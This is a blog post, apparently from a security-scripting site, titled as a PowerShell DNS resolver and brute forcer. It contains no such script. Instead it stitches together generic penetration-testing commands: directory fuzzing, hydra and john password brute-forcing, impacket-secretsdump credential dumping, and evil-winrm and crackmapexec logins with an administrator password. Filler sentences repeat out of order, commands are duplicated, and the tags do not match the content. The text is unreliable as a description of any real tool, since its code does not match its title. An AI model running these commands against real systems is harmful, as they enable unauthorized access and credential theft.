---
TitleSEO: "DNS Resolver and Brute Forcer in PowerShell | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "c, parser, rust, scanner, powershell, automation"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-898.html"
URL_IMAGES: ""
Date: "2025-11-18"
Tags: "C, Parser, Rust, Scanner, PowerShell, Automation"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-898"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-898.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `gobuster`
- `nmap`
- `evil-winrm`

## Implementation

### Core Logic

The kernel version was outdated and vulnerable to a publicly known exploit. Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.105.83.179/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.93.222.246
```

The service was running without proper input validation, leading to injection vulnerabilities. Weak file permissions allowed modification of critical system files.

### Helper Functions

Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
feroxbuster -h
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.77.143.249 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine.

```bash
crackmapexec smb 10.106.87.61 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.34.40.239 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.114.122.40/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Advanced Options

The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.86.235.41 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.115.30.108 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.68.239.219/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Output

### Example Output

Initial enumeration revealed several interesting open ports on the target. The service account had excessive permissions assigned in Active Directory.

```
[+] Scanning target...
[+] Found 18 results
[+] Done in 14.66s
```
